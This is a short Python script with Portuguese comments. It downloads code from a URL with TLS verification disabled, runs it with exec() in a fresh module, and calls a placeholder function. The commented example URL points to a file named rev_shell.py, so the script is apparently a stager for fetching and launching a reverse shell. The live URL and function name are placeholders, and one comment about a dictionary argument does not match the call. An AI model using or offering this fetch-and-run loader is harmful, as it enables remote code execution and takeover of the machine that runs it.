import requests
import types
import urllib3

# silencia o aviso de certificado inseguro (já que você usa verify=False)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#EX: url = "https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/rev_shell.py"
url = "URL with DEF"
code = requests.get(url, verify=False).text

mod = types.ModuleType("modulo_remoto")
exec(code, mod.__dict__)

# main espera um dicionário (com chave 'name')
mod.FUNCNAME()
